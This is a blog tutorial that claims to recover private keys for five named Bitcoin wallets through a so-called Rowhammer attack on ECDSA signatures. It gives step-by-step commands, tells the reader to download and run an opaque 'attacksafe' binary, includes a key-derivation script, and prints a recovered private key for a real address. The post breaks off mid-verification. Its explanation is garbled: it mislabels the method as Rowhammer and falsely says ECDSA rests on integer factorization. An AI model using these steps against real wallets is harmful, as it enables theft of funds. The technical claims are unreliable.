
		
<article id="post-650" class="post-650 post type-post status-publish format-standard hentry category-cryptanalysis">
	
	<header class="entry-header">
		<h1 class="entry-title">How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)</h1>	</header><!-- .entry-header -->
	
	
	
			<div class="entry-meta">
			<span class="posted-on" style="display: none;"><a href="https://cryptodeeptech.ru/rowhammer-attack/" rel="bookmark"><time class="entry-date published" datetime="" style="display: none;"></time><time class="updated" datetime=""></time></a></span><span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>		</div><!-- .entry-meta -->
		
	
	<div class="entry-content">
		<p style="text-align: center;"><iframe title="YouTube video player" src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/lfYPcXPzLjE.html" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>


<p>The biggest cryptographic strength of the Bitcoin cryptocurrency is a&nbsp;<a href="https://cryptodeep.ru/doc/Computational_Discrete_Mathematics.pdf" target="_blank" rel="noreferrer noopener">computational method in discrete mathematics</a>&nbsp;that takes the problem of factorization of large integers and the problem of hidden numbers&nbsp;<code>(HNP)</code>in the Bitcoin signature transaction as a basis&nbsp;<code>ECDSA</code>.<br>In this article, we will apply Signature Fault Differential Analysis&nbsp;<code>ECDSA</code>and derive a private key from a transaction for five different Bitcoin Wallets.<br><code>Rowhammer Attack on Bitcoin</code>, allows us to efficiently find all zeros for normalized polynomials modulo a certain value, and we adapt this method to a signature algorithm,&nbsp;<code>ECDSA</code>more precisely, to critically vulnerable transactions in the Bitcoin blockchain.<br>We will apply multiplication by different powers of the same element of the finite field, which, oddly enough, can coincide and give us a certain function over the finite field, which can be specified using&nbsp;<a href="https://en.wikipedia.org/wiki/Lagrange_polynomial" target="_blank" rel="noreferrer noopener">the Lagrange interpolation polynomial</a>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-107.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1156"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-108-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1162"></figure></div>


<p>The theoretical part of this attack can be found in the article from the list of popular Bitcoin attacks:&nbsp;<a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>“Rowhammer Attack on Bitcoin”</strong></a></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/0_00003.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1127"></a><figcaption><strong><code><a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">www.attacksafe.ru/rowhammer-attack-on-bitcoin</a></code></strong></figcaption></figure></div>


<p>From our early&nbsp;<a href="https://cryptodeep.ru/publication/" target="_blank" rel="noreferrer noopener">publications,</a>&nbsp;we know that there are a lot of vulnerable and weak transactions in the Bitcoin blockchain, and in the process of our cryptanalysis, we found many Bitcoin Addresses where a large number of signatures&nbsp;<code>ECDSA</code>were made with the disclosure of the secret key&nbsp;<code>"K" (NONCE)</code>.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>As a result, knowing the secret key, we can accurately obtain the private key to the Bitcoin Wallet.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Consider five Bitcoin Addresses:</h2>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Each Bitcoin Address made two critical vulnerable transactions:</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><a href="https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846</a></p><p><a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-97-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1133"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-98-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1134"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29</a></p><p><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-99-1024x201.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1136"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-100-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1138"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b</a></p><p><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-101-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1140"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-102-1024x206.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1142"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591</a></p><p><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-103-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1144"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-104-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1146"></figure>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37</a></p><p><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-105-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1148"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-106-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1150"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Disclosure of the secret key “K” (NONCE) in the Bitcoin blockchain</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing an Efficient&nbsp;<a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Rowhammer Attack</strong></a>&nbsp;Algorithm Using Our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/15RowhammerAttack" target="_blank" rel="noreferrer noopener"><strong>15RowhammerAttack Repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/15RowhammerAttack/

ls</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-110-1024x473.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1173"></figure>



<h3>Install all the packages we need</h3>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-11.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-687"><figcaption><strong><code>requirements.txt</code></strong></figcaption></figure>



<pre class="wp-block-code"><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-111-1024x448.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1175"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-112-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1177"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-114-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1179"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2></h2>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><a href="https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-115-1024x145.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1181"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-116-1024x306.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1183"></figure>



<pre class="wp-block-code"><code>R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4
Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>To implement the attack and get the secret key, we will use the&nbsp;</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">“ATTACKSAFE SOFTWARE” software</a></strong></p>



<figure class="wp-block-image"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-14.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-705"></a><figcaption><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure>



<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-118.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1188"></figure>



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-119.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1190"></figure>



<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-120.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1193"></figure>



<p><code>"ATTACKSAFE SOFTWARE"</code>includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-121-1024x630.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1195"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-122-1024x676.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1196"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-123-1024x631.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1197"></figure>



<p>then choose<code>&nbsp;-tool: rowhammer_attack</code></p>



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-125-1024x275.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1200"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-126-1024x493.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1203"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d

RawTX = 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To do this, install the&nbsp;<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;elliptic curve library :</p>



<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-44-1024x335.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-968"></figure>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-138-1024x90.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1231"></figure>



<p><code>(0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67 , 0xc6efa8de714dd94d7b659d8935aa9036ada6a2b541a03360901fc195fd0e2cf6)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4
Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
point2gen  =   (0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67 , 0xc6efa8de714dd94d7b659d8935aa9036ada6a2b541a03360901fc195fd0e2cf6)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use the&nbsp;<em>Python</em>&nbsp;script:&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d
R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4
Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-128.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1208"></figure>



<p><code>PrivKey = aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o
